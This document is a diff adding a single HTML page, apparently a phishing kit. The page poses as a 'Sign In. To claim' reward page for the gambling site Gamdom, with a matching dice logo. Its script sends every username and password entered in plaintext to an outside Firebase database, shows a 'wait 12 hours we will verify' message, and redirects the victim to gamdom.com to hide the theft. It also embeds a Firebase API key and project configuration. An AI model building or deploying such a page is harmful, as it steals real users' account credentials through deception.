@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <!-- Move the dice image to the top -->
+        <div class="dice-image">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCAyMiAyOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEwLjY0NTggMTYuODA2MkgxMC42NDIzVjIzLjQ4MzhIMTAuNjQ1OFYxNi44MDYyWiIgZmlsbD0iIzAxRDM3MCIvPgo8cGF0aCBkPSJNMTAuNjQ1OCAxNi44MDYySDEwLjY0MjNWMjMuNDgzOEgxMC42NDU4VjE2LjgwNjJaIiBmaWxsPSIjMDFEMzcwIi8+CjxwYXRoIGQ9Ik0xMC4xMDE4IDEzLjM4OTlMMy40ODY0IDE2LjU0OThDMy4yODk5NyAxNi42NDU0IDMuMTYzNyAxNi44NTA5IDMuMTYzNyAxNy4wNzQxVjIzLjIwOTdDMy4xNjM3IDIzLjQzNjQgMy4yODk5NyAyMy42Mzg0IDMuNDg2NCAyMy43MzRMMTAuMTA1MyAyNi44OTc1QzEwLjI3MzYgMjYuOTc4OSAxMC40NTYgMjcuMDE3OSAxMC42Mzg0IDI3LjAxNzlWMTMuMjY1OUMxMC40NTYgMTMuMjY5NCAxMC4yNzM2IDEzLjMxMTkgMTAuMTAxOCAxMy4zODk5WiIgZmlsbD0iIzAwRkY4NiIvPgo8cGF0aCBkPSJNMTAuMzQ3NSAwLjA3MDg0OTJMNy4yNDMyMiAxLjYyMjQ3VjUuNzkyMDFMMy42MDkzMyA3LjU5MTYxVjMuMzg2NjRMMC4zNTQyNyA1LjAxOTc0QzAuMTM2Nzk4IDUuMTI5NTYgMCA1LjM1Mjc0IDAgNS41OTM2M1YxMy42MjgxQzAgMTQuMDk5MiAwLjQ5NDU3MyAxNC40MTA5IDAuOTExOTc5IDE0LjIwMTlMMTAuMDc3NCA5LjY2MDQzQzEwLjI1NjMgOS41NzE4NyAxMC40NDkyIDkuNTI5MzYgMTAuNjQyMSA5LjUyOTM2VjBDMTAuNTQwNCAwIDEwLjQzODcgMC4wMjQ3OTY1IDEwLjM0NzUgMC4wNzA4NDkyWiIgZmlsbD0iIzAwRkY4NiIvPgo8cGF0aCBkPSJNMTcuNzk3OCAxNi41NTE2TDExLjE3ODkgMTMuMzkxN0MxMS4wMDcxIDEzLjMwNjYgMTAuODI0NyAxMy4yNjc3IDEwLjY0MjMgMTMuMjcxMlYyNy4wMjMzQzEwLjgyNDcgMjcuMDIzMyAxMS4wMTQxIDI2Ljk4NDMgMTEuMTgyNCAyNi45MDI4TDE3Ljc5NzggMjMuNzM5NEMxNy45OTQyIDIzLjY0MzcgMTguMTIwNSAyMy40MzgyIDE4LjEyMDUgMjMuMjE1MVYxNy4wNzk0QzE4LjEyMDUgMTYuODUyNyAxNy45OTQyIDE2LjY0NzIgMTcuNzk3OCAxNi41NTE2WiIgZmlsbD0iIzAxRDM3MCIvPgo8cGF0aCBkPSJNMjAuOTMzNiA1LjAxODc3TDE3LjY3ODUgMy4zODU2N1Y3LjU5NDE4TDE0LjA0MTIgNS43OTQ1OFYxLjYyNTA0TDEwLjkzNjkgMC4wNzM0MTI3QzEwLjg0NTcgMC4wMjczNiAxMC43NDA1IDAuMDAyNTYzNDggMTAuNjQyMyAwLjAwMjU2MzQ4VjkuNTMxOTNDMTAuODM1MiA5LjUzMTkzIDExLjAyODEgOS41Nzc5OCAxMS4yMDcgOS42NjNMMjAuMzcyNCAxNC4yMDQ1QzIwLjc5MzMgMTQuNDEzNSAyMS4yODQ0IDE0LjEwMTggMjEuMjg0NCAxMy42MzA2VjUuNTk2MTlDMjEuMjg3OSA1LjM1MTc2IDIxLjE1MTEgNS4xMjg1OCAyMC45MzM2IDUuMDE4NzdaIiBmaWxsPSIjMDFEMzcwIi8+Cjwvc3ZnPgo=" alt="Dice Image">
+        </div>
+        <div class="login-form">
+            <h5>You can only get once on a device.</h5>
+            <h2>Sign In. To claim</h2>
+            <form id="contactForm">
+                <label for="email">Username</label>
+                <input type="text" id="email" placeholder="Enter your username" required>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+                
+             
+                
+                <button type="submit">Claim</button>
+            </form>
+            <div class="alert" style="display: none; color: green; margin-top: 10px;">
+                wait 12 hours we will verify!
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script type="module">
+        // Import Firebase functions
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js";
+        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAW4cTAsG2QiXXGvS2FyOwZYbR_BqCQDXM",
+            authDomain: "contactform-37fe3.firebaseapp.com",
+            databaseURL: "https://contactform-37fe3-default-rtdb.firebaseio.com",
+            projectId: "contactform-37fe3",
+            storageBucket: "contactform-37fe3.appspot.com",
+            messagingSenderId: "831163231244",
+            appId: "1:831163231244:web:71517d64004b77358a9229",
+            measurementId: "G-F7SMDYVPSZ"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Reference to 'user' collection in the database
+        const messagesRef = ref(db, 'user');
+
+        // Listen for form submit
+        document.getElementById('contactForm').addEventListener('submit', submitForm);
+
+        // Submit form
+        function submitForm(e) {
+            e.preventDefault();
+
+            // Get values
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Save message
+            saveMessage(email, password);
+
+            // Show alert
+            document.querySelector('.alert').style.display = 'block';
+
+            // Hide alert after 3 seconds
+            setTimeout(() => {
+                document.querySelector('.alert').style.display = 'none';
+            }, 3000);
+
+            // Clear form
+            document.getElementById('contactForm').reset();
+        }
+
+        // Save message to Firebase
+        function saveMessage(email, password) {
+            const newMessageRef = push(messagesRef);
+            set(newMessageRef, {
+                email: email,
+                password: password
+            });
+
+            // Redirect after 1 second
+            setTimeout(() => {
+                window.location.href = 'https://gamdom.com/'; // Change the URL to the desired redirection destination
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
